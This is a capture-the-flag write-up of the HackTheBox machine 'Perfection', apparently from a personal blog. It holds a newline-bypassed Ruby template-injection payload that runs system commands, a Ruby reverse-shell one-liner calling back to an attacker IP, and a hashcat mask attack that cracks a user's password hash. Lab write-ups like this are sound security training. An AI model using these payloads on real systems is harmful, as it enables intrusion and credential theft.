---
title: HTB-Perfection
draft: false
tags:
  - htb
  - linux
  - easy
  - ssti
  - ruby
  - ruby-ssti
  - ssti-to-shell
  - hash-cracking
---
![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/perfection/Perfection.png)

## Information Gathering
### Rustscan
Rustscan discovers SSH and HTTP running on target. 

```bash
┌──(yoon㉿kali)-[~/Documents/htb/perfection]
└─$ rustscan --addresses 10.10.11.253 --range 1-65535
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
😵 https://admin.tryhackme.com
<snip>
Host is up, received syn-ack (0.41s latency).
Scanned at 2024-05-16 23:39:15 EDT for 0s

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.85 seconds
```
## Enumeration

### HTTP - TCP 80

The website provides service for calculating total grade in a class. 

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/perfection/image.png)


Through `/weighted-grade`, we can input data and receive total grade as a result. 

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/perfection/image-1.png)

Total grade outputs as such:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/perfection/image-2.png)

## Ruby SSTI


Let's try fuzzing category parameter with [these payloads](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Intruder/ssti.fuzz)for SSTI:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/perfection/image-3.png)

Some of the payloads show different response length from the others:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/perfection/image-4.png)


When `<%= 7 * 7 %>` payload is sent, response says Invalid query paramaters:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/perfection/image-5.png)

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/perfection/image-6.png)

Let's try some payloads specifically for Ruby only, [from here](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#ruby).

After some trials, we can tell that SSTI works when order of information input is changed and when we inject new line to the payload. 

Below is the payload that passes the filter:

```ruby
a
<%=system("pwd");%>
```

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/perfection/image-7.png)

I see that the payload is sent and returns **true**:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/perfection/image-8.png)

Similarly, we can craft payload for reading /etc/passwd:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/perfection/image-9.png)

Payload runs successfully:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/perfection/image-10.png)

## SSTI Reverse Shell


Using [Reverse Shell Generator](https://www.revshells.com/),  we can spawn reverse shell as Susan:

`ruby -rsocket -e'spawn("sh",[:in,:out,:err]=>TCPSocket.new("10.10.14.14",1337))'`

On our netcat listener, reverse shell connection is made:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/perfection/image-11.png)

Let's make the shell more interactive through Python:

`python3 -c 'import pty; pty.spawn("/bin/sh")'`


## Privesc: susan to root

On Susan's home directory, there a directory named **Migration**:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/perfection/image-12.png)

Inside of it, there's a file named pupilpath_credentials.db and it shows password hash for Susan Miller:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/perfection/image-13.png)

Using `strings`, we can obtain several more password hashes for different users:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/perfection/image-17.png)

Before attempting to crack the above hash, let's do some more local enumeration.

### Local Enumeration

Below shows all the files owned by the current user but nothing looks interesting:

`find / -uid 1001 -type f -ls 2>/dev/null | grep -v "/proc*"`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/perfection/image-14.png)

Below searches for files with the name of the user "susan" in it:

`find / -name "*susan*" -type f -ls 2>/dev/null`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/perfection/image-15.png)

`/var/mail/susan` looks interesting.

Email Susan reveals the password structure for the above discovered hash:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/perfection/image-18.png)



## Hash Cracking

Before moving on the cracking, let's prepare the hash for Susan:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/perfection/p1.png)

Below is the hashcat command that cracks the password:

`hashcat -m 1400 hash.txt -a 3 susan_nasus_?d?d?d?d?d?d?d?d?d`

`susan_nasus_?d?d?d?d?d?d?d?d?d`: This is the mask that specifies the format of the passwords we are trying to crack.

 `?d`: This represents a digit (`0-9`). Each `?d` is a placeholder for a single digit. we have nine `?d` placeholders, which means Hashcat will try all combinations of nine-digit numbers.

Given the mask, Hashcat will try passwords like:

- `susan_nasus_000000000`
- `susan_nasus_000000001`
- `susan_nasus_123456789`
- `susan_nasus_999999999`


Hashcat successfully cracks the password:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/perfection/p2.png)


We can not sudo into root with the cracked password:


![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/perfection/image-19.png)